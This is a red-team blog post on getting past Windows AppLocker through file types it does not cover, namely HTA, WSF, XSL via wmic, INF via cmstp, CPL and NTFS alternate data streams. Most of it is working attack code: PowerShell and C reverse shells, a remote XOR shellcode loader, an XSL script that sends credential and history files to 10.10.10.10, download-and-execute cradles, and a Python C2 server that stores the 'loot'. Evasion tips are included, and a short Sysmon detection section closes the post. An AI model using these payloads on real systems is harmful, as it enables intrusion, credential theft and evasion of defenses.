---
title: "AppLocker Bypass — File Extension Blind Spots"
date: 2026-03-06
description: "Six extension-based AppLocker bypass vectors — HTA via mshta, WSF via wscript, XSL via wmic, INF via cmstp, CPL via control.exe, and NTFS alternate data streams — with payloads and a Python C2 server."
tags: ["applocker", "bypass", "hta", "wsf", "xsl", "ads", "lolbins", "evasion", "windows", "blueteam"]
---

> **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1218.005](https://attack.mitre.org/techniques/T1218/005/) (Mshta), [T1220](https://attack.mitre.org/techniques/T1220/) (XSL Script Processing), [T1564.004](https://attack.mitre.org/techniques/T1564/004/) (ADS), [T1218.011](https://attack.mitre.org/techniques/T1218/011/) (Rundll32/CPL), and [T1218](https://attack.mitre.org/techniques/T1218/) (System Binary Proxy Execution).

---

## Lab Setup

### Recommended VM Stack

``` {linenos=inline}
Host Machine
└── Hypervisor (VMware Workstation / VirtualBox / Hyper-V)
    ├── Windows 10/11 Enterprise (victim VM)
    │   ├── AppLocker default rules enforced (Exe + Script rules)
    │   ├── Windows Defender enabled + updated
    │   ├── Sysmon (SwiftOnSecurity config)
    │   ├── Wireshark (observe HTA/WMIC HTTP fetches)
    │   ├── Sysinternals Process Monitor
    │   └── PowerShell 5.1 + Script Block Logging
    │
    └── Kali Linux (attacker VM)
        ├── Python 3.10+ (multi-extension payload server)
        ├── mingw-w64 (compile CPL payloads)
        └── netcat / rlwrap
```

### Windows VM Configuration

```powershell {linenos=inline}
# Verify AppLocker script rules are active
# These SHOULD block .ps1, .vbs, .js from untrusted paths
# but WON'T block .hta, .wsf, .xsl, .cpl

# confirm mshta.exe exists and is signed
$binaries = @(
    "$env:WINDIR\System32\mshta.exe",
    "$env:WINDIR\System32\wscript.exe",
    "$env:WINDIR\System32\cscript.exe",
    "$env:WINDIR\System32\wbem\wmic.exe",
    "$env:WINDIR\System32\cmstp.exe",
    "$env:WINDIR\System32\control.exe"
)

$binaries | ForEach-Object {
    $sig = (Get-AuthenticodeSignature $_).Status
    Write-Host "[$(if($sig -eq 'Valid'){'OK'}else{'!!'})] $(Split-Path $_ -Leaf) — $sig"
}
```

```powershell {linenos=inline}
# Enable Process Creation auditing — catch mshta/wmic child processes
AuditPol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Confirm WScript and CScript can run .wsf from temp (bypass test)
$wsf = @'
<?xml version="1.0"?>
<job><script language="JScript">
WScript.Echo("WSF executing — AppLocker Script Rules do NOT cover .wsf");
</script></job>
'@
$wsf | Out-File "$env:TEMP\test_bypass.wsf"
cscript //nologo "$env:TEMP\test_bypass.wsf"
Remove-Item "$env:TEMP\test_bypass.wsf" -Force
```

### Attacker VM Setup

```bash
# start multi-extension server (see c2_server.py in this blog)
mkdir payloads
python3 c2_server.py &

# reverse shell listener
rlwrap nc -lvnp 4444
```

### Snapshot

```
VM → Snapshot → "FILEEXT_BASELINE"
```

---

## AppLocker Extension Coverage Map

``` {linenos=inline}
┌─────────────────────────────────────────────────────────────────────┐
│              APPLOCKER DEFAULT RULE COVERAGE                        │
├───────────────────────┬─────────────────────────────────────────────┤
│   ✓ COVERED           │   ✗ NOT COVERED (bypass surface)           │
├───────────────────────┼─────────────────────────────────────────────┤
│  .exe   .com          │  .hta   ← mshta.exe     (this blog §1)     │
│  .ps1   .vbs          │  .wsf   ← wscript.exe   (this blog §2)     │
│  .js    .cmd   .bat   │  .wsc   ← wscript.exe                      │
│  .msi   .msp   .mst   │  .xsl   ← wmic.exe      (this blog §3)     │
│  .dll   .ocx          │  .inf   ← cmstp.exe     (this blog §4)     │
│  (DLL rules off)      │  .cpl   ← control.exe   (this blog §5)     │
│  .appx                │  .sct   ← regsvr32.exe                     │
│                       │  .url   .lnk   .gadget                     │
│                       │  ADS    ← any extension  (this blog §6)    │
└───────────────────────┴─────────────────────────────────────────────┘
  AppLocker evaluates file extension + publisher at process launch.
  Anything outside the left column is invisible to AppLocker policy.
```

---

## Execution Chain — Key Vectors

``` {linenos=inline}
VECTOR 1: HTA (HTML Application)
─────────────────────────────────────────────────────────────────
  mshta.exe  payload.hta
       │
       │  AppLocker: ✓ mshta.exe signed Microsoft → ALLOW
       │  AppLocker: never evaluates .hta content
       │
       ▼
  Internet Explorer engine parses HTA
       │
       ▼
  <script language="JScript"> runs
  Full WScript.Shell access, no sandbox
       │
       └─► reverse shell / shellcode


VECTOR 3: XSL via WMIC
─────────────────────────────────────────────────────────────────
  wmic.exe process get brief /format:"http://10.10.10.10/payload.xsl"
       │
       │  AppLocker: ✓ wmic.exe signed Microsoft → ALLOW
       │
       ▼
  wmic fetches XSL via WinHTTP
       │
       ▼
  MSXML parses <ms:script language="JScript">
       │
       ▼
  Script executes — no AppLocker evaluation of XSL
       │
       └─► command / reverse shell


VECTOR 6: NTFS Alternate Data Streams
─────────────────────────────────────────────────────────────────
  legit.txt              ← AppLocker evaluates THIS (primary stream)
  legit.txt:payload.ps1  ← payload hidden in named stream
       │
       │  AppLocker sees:  legit.txt  (trusted path / not a script)
       │  AppLocker BLIND: stream content
       │
  powershell -f legit.txt:payload.ps1
       │
       └─► payload executes, AppLocker never knew
```

---

## The Blind Spot

AppLocker operates on rules. Rules target specific file types. And here's the thing: AppLocker's default ruleset only covers a handful of them:

| rule category | extensions covered |
|--------------|-------------------|
| Executable Rules | `.exe`, `.com` |
| Script Rules | `.ps1`, `.vbs`, `.js`, `.cmd`, `.bat` |
| Windows Installer Rules | `.msi`, `.msp`, `.mst` |
| DLL Rules | `.dll`, `.ocx` (disabled by default) |
| Packaged App Rules | `.appx` |

That's it. Windows recognizes dozens of other file types that can execute code, and AppLocker has never heard of most of them. Anything outside that list is evaluated against no rule, which in most configurations means it runs freely.

This post covers six independent extension-based bypass vectors, each with working payloads:

| vector | extension | binary abused | noise |
|--------|-----------|--------------|-------|
| HTML Application | `.hta` | `mshta.exe` | medium |
| Windows Script File | `.wsf` | `wscript.exe` / `cscript.exe` | low |
| XSL Stylesheet | `.xsl` | `wmic.exe` | low |
| Setup Info File | `.inf` | `cmstp.exe` | low |
| Control Panel Applet | `.cpl` | `control.exe` | low |
| NTFS Alternate Data Stream | (any) | any whitelisted binary | very low |

---

## Vector 1 — HTA (HTML Application)

`.hta` files are full-trust HTML Applications executed by `mshta.exe`, a signed Microsoft binary. They can run JScript and VBScript with **no browser sandbox**, **no zone restrictions**, and full access to the Windows Scripting Host object model.

AppLocker Script Rules don't cover `.hta`. `mshta.exe` is trusted. The payload runs.

### PoC — calc pop

```html {linenos=inline}
<!-- calc.hta -->
<html>
<head>
<script language="JScript">
  var shell = new ActiveXObject("WScript.Shell");
  shell.Run("calc.exe", 0, false);
  window.close();
</script>
</head>
<body></body>
</html>
```

```cmd
mshta.exe calc.hta
mshta.exe http://10.10.10.10/calc.hta
```

---

### Reverse shell — HTA with rolling XOR shellcode loader

Full reverse shell baked into a single `.hta`. The shellcode is XOR-encrypted (matching the rolling scheme from our runner) and fetched remotely, with no plaintext payload on wire.

```html {linenos=inline}
<!-- revshell.hta -->
<!-- update: LHOST, LPORT, shellcode URL, XOR key -->
<html>
<head>
<script language="JScript">

// ── config ────────────────────────────────────────────────────────────────
var C2_URL  = "http://10.10.10.10/sc.bin";   // encrypted shellcode URL
var XOR_KEY = 0x42;                           // rolling XOR base key

// ── rolling XOR decrypt ───────────────────────────────────────────────────
function xorDecrypt(bytes, key) {
    var out = [];
    for (var i = 0; i < bytes.length; i++)
        out.push(bytes[i] ^ ((key + i) & 0xff));
    return out;
}

// ── fetch encrypted shellcode ─────────────────────────────────────────────
function fetchBytes(url) {
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", url, false);
    xhr.setRequestHeader("Accept", "*/*");
    xhr.send();
    if (xhr.status !== 200) return null;

    // responseBody is a VBArray of bytes
    return (new VBArray(xhr.responseBody)).toArray();
}

// ── VirtualAlloc + CreateThread via WScript.Shell run ────────────────────
// pure JScript can't call Win32 directly, so we generate a PS1 and run it
function execShellcode(bytes) {
    var hex = "";
    for (var i = 0; i < bytes.length; i++) {
        var b = bytes[i].toString(16);
        hex += (b.length === 1 ? "0" : "") + b;
    }

    // PowerShell shellcode runner — inline, no file drop
    var ps = "$b=[byte[]]@(" + bytes.join(",") + ");" +
             "$m=[Runtime.InteropServices.Marshal];" +
             "$p=[System.Runtime.InteropServices.DllImportAttribute];" +
             "$va=([AppDomain]::CurrentDomain.GetAssemblies()|" +
             "?{$_.GlobalAssemblyCache}|" +
             "Select -First 1).GetType('Microsoft.Win32.UnsafeNativeMethods');" +
             "$gpa=$va.GetMethod('GetProcAddress',[Reflection.BindingFlags]40,[Reflection.Binder]$null,[Type[]]@([IntPtr],[String]),[Reflection.ParameterModifier[]]$null);" +
             "$k32=[Runtime.InteropServices.Marshal]::GetHINSTANCE(([AppDomain]::CurrentDomain.GetAssemblies()|?{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('kernel32.dll')}).Modules[0]);" +
             "$va2=$m::GetDelegateForFunctionPointer($gpa.Invoke($null,[Object[]]@($k32,'VirtualAlloc')),[Action[IntPtr,UIntPtr,UInt32,UInt32]]);" +
             "$mem=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($b.Length);" +
             "$m::Copy($b,0,$mem,$b.Length);" +
             "$ct=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(" +
             "     $gpa.Invoke($null,[Object[]]@($k32,'CreateThread')),"+
             "     [Func[IntPtr,UInt32,IntPtr,IntPtr,UInt32,IntPtr]]);" +
             "$th=$ct.Invoke([IntPtr]::Zero,0,$mem,[IntPtr]::Zero,0,[IntPtr]::Zero);";

    var shell  = new ActiveXObject("WScript.Shell");
    var b64ps  = btoa(unescape(encodeURIComponent(ps)));  // crude UTF-16 B64 — use helper below for production
    shell.Run("powershell -nop -w hidden -ep bypass -EncodedCommand " + b64ps, 0, false);
}

// ── main ──────────────────────────────────────────────────────────────────
var enc = fetchBytes(C2_URL);
if (enc) {
    var dec = xorDecrypt(enc, XOR_KEY);
    execShellcode(dec);
}

window.close();

</script>
</head>
<body></body>
</html>
```

**Or — simpler PowerShell delegation (cleaner for most engagements):**

```html {linenos=inline}
<!-- ps_delegate.hta — delegates everything to PowerShell, minimal HTA footprint -->
<html>
<head>
<script language="JScript">
  var host = "10.10.10.10";
  var port = "4444";

  var ps = "$c=New-Object Net.Sockets.TCPClient('" + host + "'," + port + ");" +
           "$s=$c.GetStream();" +
           "[byte[]]$b=0..65535|%{0};" +
           "while(($i=$s.Read($b,0,$b.Length))-ne 0){" +
           "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);" +
           "$r=(iex $d 2>&1|Out-String);" +
           "$rb=[Text.Encoding]::ASCII.GetBytes($r+'PS '+(gl).Path+'> ');" +
           "$s.Write($rb,0,$rb.Length);$s.Flush()}";

  // UTF-16LE base64 for -EncodedCommand
  var enc = "";
  for (var i = 0; i < ps.length; i++)
      enc += String.fromCharCode(ps.charCodeAt(i), 0);
  var b64 = btoa(enc);

  new ActiveXObject("WScript.Shell").Run(
      "powershell -nop -w hidden -ep bypass -EncodedCommand " + b64, 0, false
  );
  window.close();
</script>
</head>
<body></body>
</html>
```

```cmd
:: local
mshta.exe ps_delegate.hta

:: remote — nothing touches disk
mshta.exe http://10.10.10.10/ps_delegate.hta

:: one-liner via run dialog or macro
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run""mshta http://10.10.10.10/ps_delegate.hta"",0:close")
```

---

## Vector 2 — WSF (Windows Script File)

`.wsf` is a Windows Script File, an XML wrapper that lets you mix JScript and VBScript in one file, reference external script libraries, and define multiple jobs. It's executed by `wscript.exe` and `cscript.exe`, both trusted binaries.

AppLocker Script Rules only target `.vbs` and `.js` individually. The `.wsf` container that wraps them is not covered.

### Reverse shell via WSF

```xml {linenos=inline}
<!-- revshell.wsf -->
<?xml version="1.0"?>
<job id="main">
  <script language="JScript">
  <![CDATA[

    var LHOST = "10.10.10.10";
    var LPORT = 4444;

    // WScript.Shell for process spawning
    var shell = new ActiveXObject("WScript.Shell");

    // build UTF-16LE base64-encoded PowerShell reverse shell
    var ps = "$c=New-Object Net.Sockets.TCPClient('" + LHOST + "'," + LPORT + ");" +
             "$s=$c.GetStream();" +
             "[byte[]]$b=0..65535|%{0};" +
             "while(($i=$s.Read($b,0,$b.Length))-ne 0){" +
             "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);" +
             "$r=(iex $d 2>&1|Out-String);" +
             "$rb=[Text.Encoding]::ASCII.GetBytes($r+'PS '+(gl).Path+'> ');" +
             "$s.Write($rb,0,$rb.Length);$s.Flush()}";

    var encoded = "";
    for (var i = 0; i < ps.length; i++)
        encoded += String.fromCharCode(ps.charCodeAt(i), 0);

    var b64 = btoa(encoded);
    shell.Run("powershell -nop -w hidden -ep bypass -EncodedCommand " + b64, 0, false);

  ]]>
  </script>
</job>
```

```cmd
:: visible console — good for testing
cscript //nologo revshell.wsf

:: silent — production
wscript //nologo revshell.wsf

:: remote
wscript //nologo \\10.10.10.10\share\revshell.wsf
```

### WSF with VBScript component (mixed engine)

```xml {linenos=inline}
<!-- mixed.wsf — demonstrates multi-engine capability -->
<?xml version="1.0"?>
<job id="main">

  <!-- VBScript helper: run a command and capture output -->
  <script language="VBScript">
    Function RunCmd(cmd)
        Dim oShell, oExec, sOut
        Set oShell = CreateObject("WScript.Shell")
        Set oExec  = oShell.Exec("cmd.exe /c " & cmd)
        Do While oExec.Status = 0
            WScript.Sleep 50
        Loop
        RunCmd = oExec.StdOut.ReadAll()
    End Function
  </script>

  <!-- JScript main: call VBScript helper, send output to C2 -->
  <script language="JScript">
  <![CDATA[
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    var out = RunCmd("whoami /all");    // calls VBScript function above

    xhr.open("POST", "http://10.10.10.10/collect", false);
    xhr.setRequestHeader("Content-Type", "text/plain");
    xhr.send(out);
  ]]>
  </script>

</job>
```

---

## Vector 3 — XSL via WMIC

`wmic.exe` has an undocumented `/format:` flag that accepts a URL to an XSL stylesheet. When it fetches the stylesheet, it processes the embedded JScript or VBScript transform, before AppLocker gets a look in.

`wmic.exe` is a signed Microsoft binary. XSL transforms are not in AppLocker's ruleset. The code runs.

### XSL reverse shell

```xml {linenos=inline}
<!-- revshell.xsl -->
<?xml version="1.0"?>
<stylesheet version="1.0"
  xmlns="http://www.w3.org/1999/XSL/Transform"
  xmlns:ms="urn:schemas-microsoft-com:xslt"
  xmlns:user="http://mycompany.com/mynamespace">

  <output method="text"/>

  <ms:script implements-prefix="user" language="JScript">
  <![CDATA[

    var LHOST = "10.10.10.10";
    var LPORT = 4444;

    var shell = new ActiveXObject("WScript.Shell");

    var ps = "$c=New-Object Net.Sockets.TCPClient('" + LHOST + "'," + LPORT + ");" +
             "$s=$c.GetStream();" +
             "[byte[]]$b=0..65535|%{0};" +
             "while(($i=$s.Read($b,0,$b.Length))-ne 0){" +
             "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);" +
             "$r=(iex $d 2>&1|Out-String);" +
             "$rb=[Text.Encoding]::ASCII.GetBytes($r+'PS '+(gl).Path+'> ');" +
             "$s.Write($rb,0,$rb.Length);$s.Flush()}";

    var enc = "";
    for (var i = 0; i < ps.length; i++)
        enc += String.fromCharCode(ps.charCodeAt(i), 0);

    shell.Run("powershell -nop -w hidden -ep bypass -EncodedCommand " + btoa(enc), 0, false);

    function Exec() { return "ok"; }

  ]]>
  </ms:script>

  <template match="/">
    <value-of select="user:Exec()"/>
  </template>

</stylesheet>
```

```cmd
:: remote — zero files on disk
wmic process get brief /format:"http://10.10.10.10/revshell.xsl"

:: local
wmic process get brief /format:"C:\Windows\Temp\revshell.xsl"

:: alternate trigger (any wmic class works, output is irrelevant)
wmic os get /format:"http://10.10.10.10/revshell.xsl"
```

> The WMIC output (process list / OS info) is just noise. Your script runs regardless. Redirect to `nul` to suppress it: `wmic ... >nul 2>&1`

### Data exfil via XSL (no outbound shell needed)

```xml {linenos=inline}
<!-- exfil.xsl — grab files and POST to C2 without spawning any child process -->
<?xml version="1.0"?>
<stylesheet version="1.0"
  xmlns="http://www.w3.org/1999/XSL/Transform"
  xmlns:ms="urn:schemas-microsoft-com:xslt"
  xmlns:user="http://mycompany.com/mynamespace">
  <output method="text"/>
  <ms:script implements-prefix="user" language="JScript">
  <![CDATA[
    function Exfil() {
        var targets = [
            "%USERPROFILE%\\Desktop",
            "%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
            "%APPDATA%\\..\\Local\\Microsoft\\Credentials"
        ];

        var shell = new ActiveXObject("WScript.Shell");
        var fso   = new ActiveXObject("Scripting.FileSystemObject");
        var xhr   = new ActiveXObject("MSXML2.XMLHTTP");

        for (var i = 0; i < targets.length; i++) {
            var path = shell.ExpandEnvironmentStrings(targets[i]);
            try {
                var f    = fso.OpenTextFile(path, 1);
                var data = f.ReadAll();
                f.Close();

                xhr.open("POST", "http://10.10.10.10/collect", false);
                xhr.setRequestHeader("X-Path", path);
                xhr.send(data);
            } catch(e) {}
        }
        return "done";
    }
  ]]>
  </ms:script>
  <template match="/">
    <value-of select="user:Exfil()"/>
  </template>
</stylesheet>
```

---

## Vector 4 — INF via CMSTP

`.inf` Setup Information Files are processed by several Windows components. `cmstp.exe`, the Microsoft Connection Manager Profile Installer, accepts an INF file and executes code defined in its `RunPreSetupCommandsSection`. It is signed, trusted, and completely off AppLocker's radar.

```ini {linenos=inline}
; payload.inf — CMSTP AppLocker bypass
; update: CommandLine value

[version]
Signature  = $chicago$
AdvancedINF = 2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs  = UnRegisterOCXSection
RegisterOCXs    = RegisterOCXSection
RunPreSetupCommands = RunPreSetupCommandsSection

[RegisterOCXSection]

[UnRegisterOCXSection]

[RunPreSetupCommandsSection]
; this command executes with user privileges before setup completes
powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')"
REGSRV=NO

[Strings]
ServiceName = "VPN"
ShortSvcName = "VPN"
```

```cmd
:: /au: auto-install for current user (no UAC prompt)
:: /ni:  non-interactive
cmstp.exe /ni /au payload.inf
```

> CMSTP will flash a small dialog on first run unless `/ni` is provided. On some configurations the dialog is unavoidable, so time your execution accordingly or chain from a macro that can click through it via `SendKeys`.

---

## Vector 5 — CPL (Control Panel Applet)

Control Panel Applets are DLLs with a `.cpl` extension. `control.exe` and `rundll32.exe` load and execute them. AppLocker's DLL rules are **disabled by default**. Even if enabled, a signed or path-whitelisted CPL will pass. An unsigned CPL in a user-writable path often runs freely.

### CPL payload (C)

```c {linenos=inline}
/* payload_cpl.c
 * Compile (cross or on target):
 *   x86_64-w64-mingw32-gcc -shared -o payload.cpl payload_cpl.c \
 *       -lws2_32 -mwindows -s -Wl,--build-id=none
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cpl.h>      /* CPlApplet signature */
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define LHOST "10.10.10.10"
#define LPORT 4444

/* forward declarations */
static DWORD WINAPI shell_thread(LPVOID lpParam);
static void reverse_shell(void);

/* ── CPlApplet — required export for .cpl files ───────────────────────── */
LONG APIENTRY CPlApplet(HWND hwnd, UINT uMsg, LPARAM lParam1, LPARAM lParam2) {
    switch (uMsg) {
        case CPL_INIT:
            /* spawn shell on a background thread so the applet "loads" cleanly */
            CreateThread(NULL, 0, shell_thread, NULL, 0, NULL);
            return TRUE;

        case CPL_GETCOUNT: return 1;
        case CPL_INQUIRE:  return 0;
        case CPL_EXIT:     return 0;
    }
    return 0;
}

/* ── DllMain — also fires on LoadLibrary, belt-and-suspenders ────────── */
BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hMod);
        CreateThread(NULL, 0, shell_thread, NULL, 0, NULL);
    }
    return TRUE;
}

static DWORD WINAPI shell_thread(LPVOID p) {
    (void)p;
    reverse_shell();
    return 0;
}

/* ── reverse shell ───────────────────────────────────────────────────── */
static void reverse_shell(void) {
    WSADATA wsa;
    SOCKET  sock;
    struct  sockaddr_in sa;
    STARTUPINFOA        si = {0};
    PROCESS_INFORMATION pi = {0};
    char    cmd[] = "cmd.exe";

    WSAStartup(MAKEWORD(2,2), &wsa);

    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                      NULL, 0, WSA_FLAG_OVERLAPPED);
    if (sock == INVALID_SOCKET) goto cleanup;

    sa.sin_family      = AF_INET;
    sa.sin_port        = htons(LPORT);
    inet_pton(AF_INET, LHOST, &sa.sin_addr);

    if (connect(sock, (SOCKADDR*)&sa, sizeof(sa)) != 0) goto cleanup;

    /* pipe stdin/stdout/stderr through the socket */
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError  = (HANDLE)sock;

    CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

cleanup:
    closesocket(sock);
    WSACleanup();
}
```

```cmd
:: via control.exe
control.exe payload.cpl

:: via rundll32 (more explicit — useful if control.exe is blocked)
rundll32.exe shell32.dll,Control_RunDLL payload.cpl

:: or just double-click — Windows associates .cpl with control.exe by default
```

---

## Vector 6 — NTFS Alternate Data Streams (ADS)

NTFS supports multiple named data streams on a single file. The primary stream is what you normally read and write. Additional named streams are invisible to Explorer, `dir`, and most AV scanners, but the Windows script engines can execute them directly.

AppLocker evaluates the **primary stream** of a file. A script hidden in a named stream of a whitelisted file bypasses that evaluation entirely.

### Hiding a payload in an ADS

```cmd
:: create an innocuous text file (or use any existing whitelisted file)
echo this is definitely not malware > legit.txt

:: write your payload into a named stream on that file
type revshell.ps1 > legit.txt:payload.ps1

:: or echo directly
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/s.ps1') > legit.txt:s.ps1
```

The file `legit.txt` looks empty to Explorer and `dir`. The payload is invisible without explicit tools.

### Executing from ADS

```cmd {linenos=inline}
:: PowerShell — execute script from ADS
powershell -nop -ep bypass -c "Get-Content legit.txt:payload.ps1 | IEX"

:: or via the stream path directly (PS 3.0+)
powershell -nop -ep bypass -f legit.txt:payload.ps1

:: wscript / cscript — direct execution from stream
wscript legit.txt:payload.js
cscript //nologo legit.txt:payload.vbs

:: mshta — HTA from an ADS
mshta.exe legit.txt:payload.hta
```

### Full ADS workflow script

```powershell {linenos=inline}
# ads_deploy.ps1 — plant and execute payload via ADS
# run this from any PowerShell session (e.g. via macro, existing foothold)

param(
    [string]$PayloadUrl  = "http://10.10.10.10/revshell.ps1",
    [string]$HostFile    = "C:\Windows\Temp\svclog.txt",       # whitelisted path
    [string]$StreamName  = "diag"                               # innocuous name
)

# create host file if it doesn't exist
if (-not (Test-Path $HostFile)) {
    Set-Content -Path $HostFile -Value "Windows Diagnostic Log $(Get-Date)"
}

# fetch and plant payload into named stream
$bytes  = (New-Object Net.WebClient).DownloadData($PayloadUrl)
$stream = [IO.File]::Open("${HostFile}:${StreamName}", [IO.FileMode]::Create)
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()

Write-Host "[+] planted ${HostFile}:${StreamName} ($(bytes.Length) bytes)"

# execute from stream — no file on disk ever holds the raw payload path
$cmd = "powershell -nop -ep bypass -w hidden -f `"${HostFile}:${StreamName}`""
Start-Process powershell -ArgumentList "-nop -ep bypass -w hidden -c `"$cmd`"" -WindowStyle Hidden

Write-Host "[*] executed"
```

### Verifying / inspecting ADS (defender perspective)

```cmd {linenos=inline}
:: list streams on a file
dir /r legit.txt

:: PowerShell
Get-Item legit.txt -Stream *

:: Sysinternals streams.exe
streams.exe legit.txt

:: remove all alternate streams
streams.exe -d legit.txt
```

---

## Python C2 Server

Single server that handles all the above vectors. It serves HTA, WSF, XSL, PS1, and binary payloads with correct content types, and logs incoming connections and exfil POSTs:

```python {linenos=inline}
#!/usr/bin/env python3
# c2_server.py — multi-extension payload server
# place your payloads in ./payloads/

from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import os, sys

PAYLOAD_DIR = "./payloads"
PORT        = 80

CONTENT_TYPES = {
    ".hta":  "application/hta",
    ".wsf":  "text/plain",
    ".xsl":  "text/xml",
    ".xml":  "text/xml",
    ".inf":  "text/plain",
    ".ps1":  "text/plain",
    ".bin":  "application/octet-stream",
    ".dll":  "application/octet-stream",
    ".cpl":  "application/octet-stream",
    ".txt":  "text/plain",
}

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")

class Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        path = os.path.join(PAYLOAD_DIR, self.path.lstrip("/"))

        if not os.path.isfile(path):
            log(f"404  {self.client_address[0]}  {self.path}")
            self.send_response(404)
            self.end_headers()
            return

        _, ext = os.path.splitext(path)
        ctype  = CONTENT_TYPES.get(ext.lower(), "application/octet-stream")

        with open(path, "rb") as f:
            data = f.read()

        log(f"GET  {self.client_address[0]}  {self.path}  ({len(data)}b)")
        self.send_response(200)
        self.send_header("Content-Type",   ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control",  "no-cache")
        self.end_headers()
        self.wfile.write(data)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length) if length else b""
        src    = self.client_address[0]
        xpath  = self.headers.get("X-Path", "unknown")

        log(f"POST {src}  {self.path}  X-Path={xpath}  ({len(body)}b)")

        # write exfil to disk
        out_dir  = f"./loot/{src}"
        os.makedirs(out_dir, exist_ok=True)
        out_file = os.path.join(out_dir, xpath.replace("\\", "_").replace(":", "").lstrip("_") or "data.bin")
        with open(out_file, "wb") as f:
            f.write(body)
        log(f"     saved → {out_file}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt, *args):
        pass  # suppress default logging — we handle it ourselves

if __name__ == "__main__":
    os.makedirs(PAYLOAD_DIR, exist_ok=True)
    os.makedirs("./loot",    exist_ok=True)
    log(f"listening on :{PORT}  payloads={PAYLOAD_DIR}")
    HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
```

```bash
# layout
payloads/
  calc.hta
  revshell.hta
  revshell.wsf
  revshell.xsl
  shell.ps1
  sc.bin        # encrypted shellcode

python3 c2_server.py
```

---

## OpSec Notes

- **HTA** — `mshta.exe` making network connections is a known red flag in most EDR products. HTTPS delivery and a clean domain reduce noise. The process hierarchy `explorer.exe → mshta.exe` is cleaner than spawning from Office macros.
- **WSF** — `wscript.exe` is quieter than PowerShell but Script Block Logging doesn't apply, making it harder for defenders to reconstruct what ran.
- **WMIC + XSL** — `wmic.exe` making outbound HTTP is unusual and will trigger on mature stacks. Prefer UNC/SMB delivery if the target has no internet egress monitoring.
- **CMSTP** — known bypass, Defender has behavioral detections. Pair with AMSI bypass if you're invoking PowerShell downstream.
- **CPL** — unsigned CPL loaded by `rundll32.exe` is a Sysmon EID 7 event. Signing the DLL with any cert (even self-signed) changes the hash and often evades static signatures.
- **ADS** — PowerShell executing from a stream path (`-f file.txt:stream`) is detectable via Script Block Logging. The stream plant itself is invisible to most scanners but Sysmon can be configured to log ADS creation.

---

## Detection (Blue Team)

| signal | event |
|--------|-------|
| `mshta.exe` network connection | Sysmon EID 3 |
| `mshta.exe` spawning `powershell.exe` / `cmd.exe` | Sysmon EID 1 — ParentImage |
| `wmic.exe` with `/format:http` in cmdline | Sysmon EID 1 — CommandLine |
| `cmstp.exe` executing commands from INF | Sysmon EID 1, Windows EID 4688 |
| `rundll32.exe` loading `.cpl` from non-system path | Sysmon EID 7 — ImageLoad |
| File write to named stream (ADS) | Sysmon EID 15 — FileCreateStreamHash |
| PowerShell `-f` with `:` in path (ADS execution) | EID 4104 — ScriptBlock |

**Sysmon rules:**

```xml {linenos=inline}
<!-- WMIC XSL abuse -->
<ProcessCreate onmatch="include">
  <Image condition="is">C:\Windows\System32\wbem\WMIC.exe</Image>
  <CommandLine condition="contains">/format:</CommandLine>
</ProcessCreate>

<!-- mshta network -->
<NetworkConnect onmatch="include">
  <Image condition="is">C:\Windows\System32\mshta.exe</Image>
</NetworkConnect>

<!-- CMSTP -->
<ProcessCreate onmatch="include">
  <Image condition="is">C:\Windows\System32\cmstp.exe</Image>
</ProcessCreate>

<!-- ADS creation -->
<FileCreateStreamHash onmatch="include">
  <TargetFilename condition="contains">:</TargetFilename>
</FileCreateStreamHash>
```

**Mitigation:** WDAC script enforcement covers more extension types than AppLocker. Blocking `mshta.exe` and `wmic.exe` at the network perimeter (outbound) cuts remote delivery for several vectors simultaneously. Sysmon EID 15 for ADS detection requires explicit configuration. It's off by default.

---

## MITRE ATT&CK

| technique | ID | vector |
|-----------|----|--------|
| System Binary Proxy Execution: Mshta | T1218.005 | HTA |
| XSL Script Processing | T1220 | XSL/WMIC |
| System Binary Proxy Execution: CMSTP | T1218.003 | INF |
| System Binary Proxy Execution: Rundll32 | T1218.011 | CPL |
| NTFS Alternate Data Streams | T1564.004 | ADS |
| Command and Scripting: Windows Script Host | T1059.005 | WSF |
| Defense Evasion | TA0005 | all |

---

## References

- [MITRE ATT&CK T1218.005 — Mshta](https://attack.mitre.org/techniques/T1218/005/)
- [MITRE ATT&CK T1220 — XSL Script Processing](https://attack.mitre.org/techniques/T1220/)
